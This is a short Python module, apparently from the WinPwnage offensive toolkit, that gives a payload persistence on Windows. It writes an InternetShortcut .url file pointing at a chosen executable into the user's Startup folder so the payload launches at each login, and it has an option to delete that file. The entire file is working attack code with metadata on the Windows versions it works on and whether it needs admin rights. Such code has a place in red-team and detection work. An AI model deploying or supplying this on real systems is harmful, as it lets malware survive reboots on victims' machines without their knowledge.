from winpwnage.core.prints import *
from winpwnage.core.utils import *

startup_files_info = {
	"Description": "Gain persistence using Startup Files",
	"Id": "9",
	"Type": "Persistence",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "startup_files",
	"Function Payload": True,
}


def startup_files(payload, name="", add=True):
	appdata = os.path.expandvars("%AppData%")
	startup_dir = os.path.join(appdata, r'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
	if not os.path.exists(startup_dir):
		print_error("Start up directory not found: {directory}".format(directory=startup_dir))
		return False

	startup_file_path = os.path.join(startup_dir, '{name}.eu.url'.format(name=name))
	if add:
		if payloads().exe(payload):
			with open(startup_file_path, 'w') as f:
				f.write('\n[InternetShortcut]\nURL=file:///{payload}\n'.format(payload=payload))
			print_success('Startup file created: {path}'.format(path=startup_file_path))
			print_success("Successfully installed persistence, payload will run at login")
			return True
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		print_info("Removing startup file ({path})".format(path=startup_file_path))
		try:
			os.remove(startup_file_path)
			print_success("Successfully removed persistence")
		except Exception:
			print_error("Unable to remove persistence")
			return False
